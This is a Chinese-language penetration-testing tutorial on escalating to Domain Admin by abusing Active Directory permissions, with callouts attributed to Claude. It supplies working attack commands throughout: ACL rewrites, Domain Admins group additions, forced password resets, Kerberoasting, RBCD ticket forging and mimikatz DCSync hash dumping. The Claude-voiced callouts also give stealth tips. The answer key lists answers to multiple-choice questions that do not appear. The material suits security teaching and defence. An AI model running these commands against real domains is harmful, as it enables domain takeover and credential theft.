# Module 16: Active Directory 权限滥用

---

## 【Claude的学习建议】

> **AD权限滥用是域渗透的核心技能！**
>
> 在真实的域环境中，很多时候你不需要找漏洞，只需要找到"配置错误"的权限。
> 管理员可能无意中给了某个用户过多的权限，而这就是你的突破口。
>
> **学习目标**：
> 1. 理解AD的权限模型（安全描述符、DACL、ACE）
> 2. 掌握如何枚举AD权限（PowerView、BloodHound）
> 3. 学会利用各种危险权限（GenericAll、WriteDACL等）
>
> **给零基础同学的话**：
> 想象AD权限就像公司的门禁系统：
> - 每个房间（AD对象）都有一个门禁名单（DACL）
> - 名单上写着谁能进、谁不能进（ACE）
> - 如果你能修改门禁名单（WriteDACL），你就能让自己进任何房间
> - 如果你是房间的主人（Owner），你当然可以修改门禁名单
>
> **为什么AD权限滥用这么重要？**
> - 不需要利用漏洞，只需要利用配置错误
> - 很多企业的AD权限配置混乱
> - BloodHound可以自动发现攻击路径
> - 一旦找到权限链，可以直达域管理员

## 一、AD 权限基础

> 【Claude的通俗解释】
>
> **什么是AD对象？**
>
> AD里的"对象"就是域里的各种东西：
> ```
> AD对象类型：
> ├── 用户对象 (User) - 域用户账户
> ├── 组对象 (Group) - 用户组，如Domain Admins
> ├── 计算机对象 (Computer) - 加入域的电脑
> ├── OU对象 (Organizational Unit) - 组织单位，用于分类管理
> └── GPO对象 (Group Policy Object) - 组策略
> ```
>
> **每个对象都有"权限设置"**：
> - 谁可以读取这个对象？
> - 谁可以修改这个对象？
> - 谁可以删除这个对象？
>
> 这些权限设置就存储在"安全描述符"里。

### 1.1 AD 对象与权限

Active Directory 中的每个对象都有一个**安全描述符 (Security Descriptor)**，包含：

```
安全描述符结构:
+------------------+
| Owner SID        |  <- 对象所有者
+------------------+
| Group SID        |  <- 主要组
+------------------+
| DACL             |  <- 自主访问控制列表
| (Discretionary   |     定义谁可以访问
|  Access Control  |
|  List)           |
+------------------+
| SACL             |  <- 系统访问控制列表
| (System Access   |     定义审计规则
|  Control List)   |
+------------------+
```

### 1.2 访问控制条目 (ACE)

> 【Claude的深入解释】
>
> **ACE就是门禁名单上的一条记录**
>
> ```
> 一条ACE的内容：
> ┌─────────────────────────────────────────┐
> │ "允许 张三 读取 这个用户对象"            │
> │                                         │
> │ Trustee: 张三 (被授权的人)              │
> │ Access Type: 允许 (Allow)               │
> │ Rights: 读取 (Read)                     │
> │ Object Type: 用户对象                   │
> └─────────────────────────────────────────┘
> ```
>
> **DACL = 很多条ACE的集合**
> ```
> DACL (门禁名单):
> ├── ACE 1: 允许 Domain Admins 完全控制
> ├── ACE 2: 允许 IT-Support 读取
> ├── ACE 3: 允许 HR-Group 修改密码
> └── ACE 4: 拒绝 Guest 访问
> ```

DACL 由多个 ACE 组成，每个 ACE 定义：

| 字段 | 说明 |
|------|------|
| Trustee | 被授权的主体 (用户/组) |
| Access Type | 允许 (Allow) 或拒绝 (Deny) |
| Rights | 具体权限 |
| Object Type | 适用的对象类型 (可选) |
| Inherited Object Type | 继承的对象类型 (可选) |

### 1.3 常见的 AD 权限

> 【Claude的重要概念】
>
> **这些权限是攻击者最关心的！**
>
> ```
> 权限危险程度排名：
>
> 1. GenericAll (完全控制) - 最危险！
>    └── 可以做任何事：改密码、加组、删除...
>
> 2. WriteDACL (修改权限列表) - 极其危险！
>    └── 可以给自己加任何权限
>
> 3. WriteOwner (修改所有者) - 很危险！
>    └── 成为所有者后可以修改DACL
>
> 4. GenericWrite (写入属性) - 危险！
>    └── 可以修改对象的属性
>
> 5. ForceChangePassword (强制改密码) - 危险！
>    └── 不需要知道原密码就能改
> ```
>
> **记住这个攻击思路**：
> - 找到你有权限的对象
> - 利用权限提升自己
> - 最终目标：Domain Admins

| 权限 | 说明 | 危险程度 |
|------|------|----------|
| GenericAll | 完全控制 | ⭐⭐⭐⭐⭐ |
| GenericWrite | 写入所有属性 | ⭐⭐⭐⭐⭐ |
| WriteOwner | 修改所有者 | ⭐⭐⭐⭐ |
| WriteDACL | 修改 DACL | ⭐⭐⭐⭐⭐ |
| WriteProperty | 写入特定属性 | ⭐⭐⭐ |
| Self | 自我权限 | ⭐⭐ |
| ExtendedRight | 扩展权限 | ⭐⭐⭐⭐ |
| ForceChangePassword | 强制修改密码 | ⭐⭐⭐⭐ |

## 二、枚举 AD 权限

> 【Claude的实战指南】
>
> **枚举是攻击的第一步！**
>
> 在域渗透中，你需要回答这个问题：
> "我当前的用户对哪些对象有什么权限？"
>
> **两大枚举工具**：
> | 工具 | 特点 | 使用场景 |
> |------|------|----------|
> | PowerView | PowerShell脚本，灵活 | 手动枚举，精确查询 |
> | BloodHound | 图形化，自动分析 | 发现攻击路径，全局视图 |
>
> **推荐流程**：
> 1. 先用BloodHound收集数据，看全局
> 2. 发现可疑路径后，用PowerView深入分析
> 3. 确认权限后，开始利用

### 2.1 使用 PowerView

```powershell
# 导入 PowerView
Import-Module .\PowerView.ps1

# 枚举域中所有 ACL
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# 查找有趣的 ACL
Find-InterestingDomainAcl -ResolveGUIDs

# 查找对特定用户有权限的对象
Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDACL"}

# 查找当前用户可以控制的对象
$sid = Get-DomainUser -Identity "current_user" | Select-Object -ExpandProperty objectsid
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```

### 2.2 使用 BloodHound

> 【Claude的工具介绍】
>
> **BloodHound是域渗透的神器！**
>
> ```
> BloodHound的工作原理：
>
> 1. 收集阶段 (SharpHound)
>    ├── 枚举所有用户、组、计算机
>    ├── 枚举所有ACL权限
>    ├── 枚举会话信息
>    └── 生成JSON/ZIP文件
>
> 2. 分析阶段 (BloodHound GUI)
>    ├── 导入数据到Neo4j图数据库
>    ├── 可视化显示权限关系
>    └── 自动计算攻击路径
> ```
>
> **BloodHound能回答的问题**：
> - 从当前用户到Domain Admins的最短路径？
> - 谁对Domain Admins组有控制权？
> - 哪些用户有DCSync权限？
>
> **常用的BloodHound查询**：
> - "Shortest Path to Domain Admins"
> - "Find Principals with DCSync Rights"
> - "Find Computers where Domain Users are Local Admin"

```powershell
# 收集数据
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp

# 或使用 SharpHound.exe
.\SharpHound.exe -c All

# 导入数据到 BloodHound
# 1. 启动 Neo4j 数据库
# 2. 启动 BloodHound
# 3. 上传 zip 文件
```

### 2.3 使用 AD 模块

```powershell
# 导入 AD 模块
Import-Module ActiveDirectory

# 获取对象的 ACL
(Get-Acl "AD:CN=Domain Admins,CN=Users,DC=corp,DC=com").Access

# 查找特定权限
Get-ADUser -Filter * | ForEach-Object {
    $acl = Get-Acl "AD:$($_.DistinguishedName)"
    $acl.Access | Where-Object {
        $_.ActiveDirectoryRights -match "GenericAll"
    }
}
```

### 2.4 使用 .NET 枚举 ACL

```csharp
using System;
using System.DirectoryServices;
using System.Security.AccessControl;

class EnumAcl
{
    static void Main()
    {
        // 连接到域
        DirectoryEntry entry = new DirectoryEntry("LDAP://DC=corp,DC=com");
        DirectorySearcher searcher = new DirectorySearcher(entry);

        // 搜索所有用户
        searcher.Filter = "(objectClass=user)";

        foreach (SearchResult result in searcher.FindAll())
        {
            DirectoryEntry userEntry = result.GetDirectoryEntry();
            ActiveDirectorySecurity acl = userEntry.ObjectSecurity;

            foreach (ActiveDirectoryAccessRule rule in acl.GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount)))
            {
                // 检查危险权限
                if (rule.ActiveDirectoryRights.HasFlag(ActiveDirectoryRights.GenericAll) ||
                    rule.ActiveDirectoryRights.HasFlag(ActiveDirectoryRights.WriteDacl) ||
                    rule.ActiveDirectoryRights.HasFlag(ActiveDirectoryRights.WriteOwner))
                {
                    Console.WriteLine("Object: " + userEntry.Name);
                    Console.WriteLine("  Principal: " + rule.IdentityReference);
                    Console.WriteLine("  Rights: " + rule.ActiveDirectoryRights);
                    Console.WriteLine();
                }
            }
        }
    }
}
```

### 2.5 使用 LDAP 枚举 ACL

```csharp
using System;
using System.DirectoryServices;

class LdapEnumAcl
{
    static void Main()
    {
        // 使用LDAP查询获取对象的nTSecurityDescriptor属性
        DirectoryEntry entry = new DirectoryEntry("LDAP://CN=Domain Admins,CN=Users,DC=corp,DC=com");

        // 获取安全描述符
        byte[] securityDescriptor = (byte[])entry.Properties["nTSecurityDescriptor"].Value;

        // 解析安全描述符
        ActiveDirectorySecurity acl = new ActiveDirectorySecurity();
        acl.SetSecurityDescriptorBinaryForm(securityDescriptor);

        // 枚举ACE
        foreach (ActiveDirectoryAccessRule rule in acl.GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier)))
        {
            Console.WriteLine("Principal SID: " + rule.IdentityReference);
            Console.WriteLine("Rights: " + rule.ActiveDirectoryRights);
            Console.WriteLine("Access Type: " + rule.AccessControlType);
            Console.WriteLine();
        }
    }
}
```

## 三、GenericAll 权限滥用

> 【Claude的攻击指南】
>
> **GenericAll = 完全控制 = 可以为所欲为！**
>
> 如果你对某个对象有GenericAll权限，你基本上就是这个对象的"上帝"。
>
> **对不同对象的GenericAll利用方式**：
>
> ```
> 对用户的GenericAll：
> ├── 方法1: 直接重置密码 → 登录该用户
> ├── 方法2: 设置SPN → Kerberoasting获取哈希
> └── 方法3: 禁用预认证 → AS-REP Roasting
>
> 对组的GenericAll：
> └── 直接把自己加入该组 → 继承组的所有权限
>
> 对计算机的GenericAll：
> └── 设置RBCD → 模拟管理员访问该计算机
> ```
>
> **选择哪种方法？**
> - 想要隐蔽：用Kerberoasting（不改密码）
> - 想要快速：直接改密码
> - 目标是计算机：用RBCD

### 3.1 对用户的 GenericAll

如果你对一个用户有 GenericAll 权限，你可以：

```powershell
# 方法 1: 重置密码
Set-ADAccountPassword -Identity "target_user" -Reset -NewPassword (ConvertTo-SecureString "NewP@ssw0rd!" -AsPlainText -Force)

# 方法 2: 设置 SPN (Kerberoasting)
Set-ADUser -Identity "target_user" -ServicePrincipalNames @{Add="fake/spn"}

# 然后进行 Kerberoasting
Rubeus.exe kerberoast /user:target_user

# 方法 3: 禁用预认证 (AS-REP Roasting)
Set-ADAccountControl -Identity "target_user" -DoesNotRequirePreAuth $true

# 然后进行 AS-REP Roasting
Rubeus.exe asreproast /user:target_user
```

### 3.2 对组的 GenericAll

```powershell
# 将自己添加到组
Add-ADGroupMember -Identity "Domain Admins" -Members "current_user"

# 或使用 net 命令
net group "Domain Admins" current_user /add /domain
```

### 3.3 对计算机的 GenericAll

> 【Claude的高级技术】
>
> **RBCD (Resource-Based Constrained Delegation) 攻击**
>
> 这是一个比较复杂但非常强大的攻击技术。
>
> ```
> RBCD攻击原理：
>
> 正常情况：
> 用户A → 服务B → 服务C
> (服务B需要"委派权限"才能代表用户A访问服务C)
>
> RBCD攻击：
> 1. 你控制一个计算机账户（FAKE01$）
> 2. 你对目标计算机有GenericAll权限
> 3. 你设置目标计算机"信任FAKE01$的委派"
> 4. FAKE01$就可以模拟任何用户访问目标计算机
> ```
>
> **简单理解**：
> - 你告诉目标计算机："FAKE01$是可信的，它说它是管理员，你就当它是管理员"
> - 然后你用FAKE01$说："我是管理员，让我进去"
> - 目标计算机就让你进去了

```powershell
# 方法 1: 基于资源的约束委派 (RBCD)
# 需要一个我们控制的计算机账户

# 创建计算机账户
New-MachineAccount -MachineAccount "FAKE01" -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 设置 RBCD
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-xxx-xxx-xxx-xxxx)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-ADComputer -Identity "target_computer" -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# 获取票据
Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target_computer.domain.com /ptt
```

## 四、WriteDACL 权限滥用

> 【Claude的核心概念】
>
> **WriteDACL = 可以修改权限列表 = 可以给自己任何权限！**
>
> 这是一个非常危险的权限，因为：
> ```
> 有WriteDACL权限：
>     ↓
> 给自己添加GenericAll权限
>     ↓
> 现在你有完全控制权了！
> ```
>
> **WriteDACL的特殊用途 - DCSync**：
> ```
> 如果你对域对象(DC=corp,DC=com)有WriteDACL：
>     ↓
> 给自己添加DCSync权限
>     ↓
> 执行DCSync，获取所有用户的哈希
>     ↓
> 包括krbtgt的哈希（可以做Golden Ticket）
> ```
>
> **DCSync是什么？**
> - 模拟域控制器，请求复制数据
> - 可以获取任何用户的密码哈希
> - 不需要登录域控，远程就能执行

### 4.1 WriteDACL 概述

WriteDACL 权限允许修改对象的 DACL，这意味着你可以给自己授予任何权限。

### 4.2 利用 WriteDACL

```powershell
# 使用 PowerView 添加 GenericAll 权限
Add-DomainObjectAcl -TargetIdentity "target_user" -PrincipalIdentity "current_user" -Rights All

# 或者添加 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=com" -PrincipalIdentity "current_user" -Rights DCSync

# 然后执行 DCSync
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
```

### 4.3 使用 .NET 修改 ACL

```csharp
using System;
using System.DirectoryServices;
using System.Security.AccessControl;
using System.Security.Principal;

class ModifyAcl
{
    static void Main()
    {
        // 连接到目标对象
        DirectoryEntry entry = new DirectoryEntry("LDAP://CN=Target User,CN=Users,DC=corp,DC=com");

        // 获取当前 ACL
        ActiveDirectorySecurity acl = entry.ObjectSecurity;

        // 创建新的 ACE
        SecurityIdentifier sid = new SecurityIdentifier("S-1-5-21-xxx-xxx-xxx-xxxx"); // 当前用户 SID
        ActiveDirectoryAccessRule rule = new ActiveDirectoryAccessRule(
            sid,
            ActiveDirectoryRights.GenericAll,
            AccessControlType.Allow
        );

        // 添加 ACE
        acl.AddAccessRule(rule);

        // 保存更改
        entry.CommitChanges();

        Console.WriteLine("[+] ACL 已修改");
    }
}
```

## 五、WriteOwner 权限滥用

> 【Claude的攻击链解释】
>
> **WriteOwner = 可以修改所有者 = 间接获得WriteDACL**
>
> ```
> WriteOwner攻击链：
>
> 步骤1: 你有WriteOwner权限
>     ↓
> 步骤2: 把对象的所有者改成自己
>     ↓
> 步骤3: 作为所有者，你自动有WriteDACL权限
>     ↓
> 步骤4: 给自己添加GenericAll权限
>     ↓
> 步骤5: 完全控制该对象
> ```
>
> **为什么所有者有WriteDACL？**
> - 这是Windows的设计：所有者可以管理自己的东西
> - 就像你是房子的主人，你当然可以决定谁能进来

### 5.1 WriteOwner 概述

WriteOwner 权限允许修改对象的所有者。成为所有者后，你可以修改 DACL。

### 5.2 利用 WriteOwner

```powershell
# 步骤 1: 修改所有者为当前用户
Set-DomainObjectOwner -Identity "target_object" -OwnerIdentity "current_user"

# 步骤 2: 给自己添加 GenericAll 权限
Add-DomainObjectAcl -TargetIdentity "target_object" -PrincipalIdentity "current_user" -Rights All

# 步骤 3: 利用 GenericAll 权限
# (参考上面的 GenericAll 利用方法)
```

## 六、扩展权限滥用

> 【Claude的扩展权限解释】
>
> **扩展权限 (Extended Rights) 是什么？**
>
> 除了基本的读/写/删除权限，AD还有一些"特殊权限"：
>
> ```
> 常见的扩展权限：
>
> 1. ForceChangePassword
>    └── 不需要知道原密码就能改密码
>    └── GUID: 00299570-246d-11d0-a768-00aa006e0529
>
> 2. DS-Replication-Get-Changes
>    └── DCSync需要的权限之一
>    └── GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
>
> 3. DS-Replication-Get-Changes-All
>    └── DCSync需要的权限之二
>    └── GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
> ```
>
> **DCSync权限检查**：
> - 如果一个用户同时有上面两个Replication权限
> - 那么这个用户可以执行DCSync攻击
> - 默认只有Domain Admins和Domain Controllers有这个权限

### 6.1 ForceChangePassword

```powershell
# 如果有 ForceChangePassword 权限
# 可以在不知道原密码的情况下重置密码

# 使用 PowerView
Set-DomainUserPassword -Identity "target_user" -AccountPassword (ConvertTo-SecureString "NewP@ssw0rd!" -AsPlainText -Force)

# 使用 net 命令
net user target_user NewP@ssw0rd! /domain
```

### 6.2 User-Force-Change-Password

```powershell
# 这是一个扩展权限，允许强制修改密码
# GUID: 00299570-246d-11d0-a768-00aa006e0529

# 检查是否有此权限
Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs | ? {$_.ObjectAceType -match "User-Force-Change-Password"}
```

### 6.3 DS-Replication-Get-Changes

```powershell
# DCSync 需要的权限
# DS-Replication-Get-Changes: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
# DS-Replication-Get-Changes-All: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

# 检查是否有 DCSync 权限
Get-DomainObjectAcl -Identity "DC=corp,DC=com" -ResolveGUIDs | ? {
    ($_.ObjectAceType -match "DS-Replication-Get-Changes") -and
    ($_.ActiveDirectoryRights -match "ExtendedRight")
}

# 如果有权限，执行 DCSync
mimikatz # lsadump::dcsync /domain:corp.com /all
```

## 七、实战攻击链

> 【Claude的实战思路】
>
> **AD权限滥用的核心思想：权限链**
>
> 在真实环境中，你很少能直接找到对Domain Admins的权限。
> 但是，你可能找到一条"权限链"：
>
> ```
> 典型的权限链：
>
> 你的用户 (普通员工)
>     │
>     │ 对IT-Support组有GenericAll
>     ↓
> IT-Support组
>     │
>     │ 对Service-Accounts OU有WriteDACL
>     ↓
> svc_admin用户 (在Service-Accounts OU里)
>     │
>     │ 是Domain Admins成员
>     ↓
> Domain Admins (目标达成！)
> ```
>
> **BloodHound就是用来发现这种权限链的！**
>
> **攻击步骤总结**：
> 1. 枚举 - 找到权限链
> 2. 利用 - 一步步沿着链走
> 3. 提权 - 最终获得Domain Admins

### 7.1 场景：从普通用户到域管理员

```
攻击链示例:

1. 枚举 ACL
   ↓
2. 发现对 IT-Support 组有 GenericAll 权限
   ↓
3. 将自己添加到 IT-Support 组
   ↓
4. IT-Support 组对 Service-Accounts OU 有 WriteDACL 权限
   ↓
5. 给自己添加对 svc_admin 用户的 GenericAll 权限
   ↓
6. 重置 svc_admin 密码
   ↓
7. svc_admin 是 Domain Admins 成员
   ↓
8. 获得域管理员权限
```

### 7.2 PowerShell 实现

```powershell
# 步骤 1: 枚举
Import-Module .\PowerView.ps1
Find-InterestingDomainAcl -ResolveGUIDs | Out-File acl_report.txt

# 步骤 2: 添加到组
Add-ADGroupMember -Identity "IT-Support" -Members "current_user"

# 步骤 3: 添加 ACL
Add-DomainObjectAcl -TargetIdentity "svc_admin" -PrincipalIdentity "current_user" -Rights All

# 步骤 4: 重置密码
Set-DomainUserPassword -Identity "svc_admin" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)

# 步骤 5: 使用新凭据
runas /user:corp\svc_admin cmd.exe
```

### 实践题

1. 描述如何利用对一个组的 GenericAll 权限来提升权限。

2. 解释 WriteOwner 和 WriteDACL 权限的区别，以及如何利用它们。

### 答案

**选择题**：1-B, 2-B, 3-B, 4-B, 5-C

**实践题参考答案**：

1. 利用对组的 GenericAll：
   - 将自己添加到该组
   - 继承该组的所有权限
   - 如果该组有特权（如 Domain Admins），直接获得域管理员权限
   - 如果该组对其他对象有权限，可以进一步利用

2. WriteOwner vs WriteDACL：
   - WriteOwner：可以修改对象所有者，成为所有者后可以修改 DACL
   - WriteDACL：直接修改 DACL，给自己添加权限
   - 利用 WriteOwner：先改所有者为自己，再修改 DACL
   - 利用 WriteDACL：直接添加 GenericAll 权限
